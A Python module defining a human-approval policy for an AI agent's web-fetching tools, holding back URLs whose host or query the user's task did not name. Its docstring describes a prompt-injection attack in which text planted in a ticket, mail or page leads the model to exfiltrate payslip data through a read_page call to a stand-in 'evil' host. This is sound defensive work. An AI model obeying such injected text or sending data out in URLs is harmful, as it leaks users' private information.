"""Flow step policy for tools that reach the public web (KAN-69 SV2-01).

A READ tool runs without approval, but one that fetches a URL can carry data out in the URL: text injected through a Jira
ticket, a mail or a page can make the model call read_page("https://evil/?d=<payslip text>"). So a network step runs on its
own only when every URL in its arguments names a host the person's task named, and its query (if any) appears in the task
too; anything else waits for a human, who sees the exact URL. Fails closed: a value that cannot be parsed needs approval.
"""
from __future__ import annotations

import re
from typing import Any, Callable, Dict, Iterator
from urllib.parse import urlsplit

NETWORK_TOOLS = frozenset({"ADVANCED_SEARCH_ENGINE.read_page", "ADVANCED_SEARCH_ENGINE.web_search", "AUTONOMOUS_RESEARCH_ENGINE.research"})
_URL = re.compile(r"(?:https?:)?//[^\s\"'<>]+|\bwww\.[^\s\"'<>]+", re.I)


def _strings(v: Any) -> Iterator[str]:
    if isinstance(v, str):
        yield v
    elif isinstance(v, dict):
        for x in v.values():
            yield from _strings(x)
    elif isinstance(v, (list, tuple)):
        for x in v:
            yield from _strings(x)


def urls_in_task(task: str, args: Dict[str, Any]) -> bool:
    """True when every URL in `args` has a host and a query that the task text itself contains."""
    text = task.lower()
    for s in _strings(args):
        for m in _URL.findall(s):
            try:
                p = urlsplit(m if "//" in m else "//" + m)
                host = (p.hostname or "").lower()
            except ValueError:
                return False
            if not host or host not in text or (p.query and p.query.lower() not in text):
                return False
    return True


def permit_for(task: str, base: Callable[[str], bool]) -> Callable[[str, Dict[str, Any]], str]:
    """A Flow `permit`: the tool's own rule (`base(name)` = needs approval), plus approval for a network step that names
    something the task did not."""
    def permit(name: str, args: Dict[str, Any]) -> str:
        if base(name) or (name in NETWORK_TOOLS and not urls_in_task(task, args)):
            return "approve"
        return "allow"
    return permit
